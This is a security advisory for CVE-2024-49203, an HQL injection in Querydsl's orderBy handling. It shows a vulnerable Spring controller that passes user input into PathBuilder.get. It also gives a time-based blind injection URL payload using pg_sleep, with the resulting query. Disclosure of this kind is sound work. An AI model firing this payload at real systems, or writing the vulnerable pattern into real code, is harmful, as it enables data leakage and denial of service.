summary: "Querydsl vulnerable to HQL injection through orderBy\n### Summary\nThe order by method\
  \ enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage\
  \ of sensitive information, and potentially also Denial Of Service. This vulnerability is\
  \ present since the original querydsl repository(https://github.com/querydsl/querydsl) where\
  \ it was assigned preliminary CVE identifier **CVE-2024-49203**.\n\n### Details\nVulnerable\
  \ code may look as follows:\n```\n@GetMapping\npublic List<Test> getProducts(@RequestParam(\"\
  orderBy\") String orderBy) {\n    JPAQuery<Test> query = new JPAQuery<Test>(entityManager).from(test);\n\
  \    PathBuilder<Test> pathBuilder = new PathBuilder<>(Test.class, \"test\");\n\n    OrderSpecifier\
  \ order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n    JPAQuery<Test> orderedQuery\
  \ = query.orderBy(order);\n    return orderedQuery.fetch();\n}\n```\nWhere vulnerability is\
  \ either caused by ```pathBuilder.get(orderBy)``` or the ```orderBy(order)``` method itself,\
  \ based on where the security checks are expected.\n\n### PoC\nFull POC code is available\
  \ in repository:\nhttps://github.com/CSIRTTrizna/CVE-2024-49203/\nWhen we take a look at source\
  \ code shown in Details section the functionality is as follows:\n\n1) Create JPAQuery object\
  \ instance:\n```\nJPAQuery<Test> query = new JPAQuery<Test>(entityManager).from(test);\n```\n\
  \n2) Create OrderSpecifier object instance:\n```\nPathBuilder<Test> pathBuilder = new PathBuilder<>(Test.class,\
  \ \"test\");\nOrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n\
  ```\nWhere orderBy variable is user provided input.\n\n3) order and run the query\n```\nJPAQuery<Test>\
  \ orderedQuery = query.orderBy(order);\norderedQuery.fetch();\n```\n\nWhen user goes to URL\
  \ \n```/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10)\
  \ AS text))='2'+ORDER+BY+t.id```\nThe generated query will look something like this:\n```\n\
  select test                                                                              \
  \                                                       \nfrom Test test\norder by test.name\
  \ INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id\
  \ asc\n```\n\n#### Environment\n\nLibrary versions used in proof of concept to reproduce the\
  \ vulnerability:\n```\nquerydsl-jpa: 6.8.0\nquerydsl-apt: 6.8.0\nhibernate-core: 6.1.1.Final\n\
  jakarta.persistence-api: 3.1.0\npostgresql: 42.7.4\n```\n\n### Impact\nThe vulnerability is\
  \ HQL injection, so anyone using source code similar to one provided in details is exposed\
  \ to potentional information leakage and denial of service."
